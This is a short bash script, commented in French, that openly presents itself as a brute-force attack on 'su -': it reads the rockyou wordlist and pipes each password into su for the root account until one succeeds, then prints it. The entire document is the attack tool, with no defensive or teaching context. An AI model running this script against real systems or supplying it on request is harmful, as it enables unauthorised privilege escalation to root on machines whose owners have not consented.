#!/bin/bash

# Script d'attaque brute force sur 'su -'
echo "Lancement de l'attaque brute force sur 'su -'..."

USER="root" # Utilisateur cible
WORDLIST="/usr/share/wordlists/rockyou.txt" # Liste des mots de passe à tester

# Vérification du fichier wordlist
if [ ! -f "$WORDLIST" ]; then
    echo "Fichier wordlist introuvable : $WORDLIST"
    exit 1
fi

# Lancer l'attaque
while read -r PASSWORD; do
    echo "Test du mot de passe : $PASSWORD"
    echo "$PASSWORD" | su - $USER -c "id" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Mot de passe trouvé : $PASSWORD"
        exit 0
    fi
done < "$WORDLIST"

echo "Attaque terminée. Aucun mot de passe trouvé."
